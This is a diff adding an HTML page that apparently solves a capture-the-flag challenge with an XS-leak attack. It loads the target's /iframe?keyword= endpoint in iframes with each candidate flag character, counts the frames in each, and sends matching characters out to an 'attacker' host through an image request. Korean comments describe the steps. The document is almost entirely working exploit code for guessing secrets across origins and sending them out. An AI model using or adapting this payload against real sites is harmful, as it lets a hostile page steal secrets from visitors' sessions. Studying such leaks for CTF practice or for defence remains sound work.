@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<body>
+    <script>
+        const fl = "{{ flag }}";
+        const charset = [
+            'a','b','c','d','e','f','g','h','i','j','k','l','m',
+            'n','o','p','q','r','s','t','u','v','w','x','y','z','}'
+        ];
+
+        charset.forEach((chr) => {
+            const iframe = document.createElement("iframe");
+            const url = `/iframe?keyword=` + fl + `${encodeURIComponent(chr)}`;
+            iframe.src = url;
+            
+            iframe.onload = () => {
+            let frameCount;
+
+            try {
+                // window.length === frames.length
+                frameCount = iframe.contentWindow.length;
+            } catch (e) {
+                // cross-origin 문제 등으로 접근 불가한 경우 그냥 종료
+                document.body.removeChild(iframe);
+                return;
+            }
+
+            // 🔹 프레임 수가 1 이상이면 공격자 서버로 문자 전송
+            if (frameCount >= 1) {
+                const img = new Image();
+                img.src = `공격자?flag=${encodeURIComponent(chr)}`;
+            }
+
+            // 너무 많이 쌓이지 않도록 iframe 제거
+            document.body.removeChild(iframe);
+            };
+
+            document.body.appendChild(iframe);
+        });
+    </script>
+
+</body>
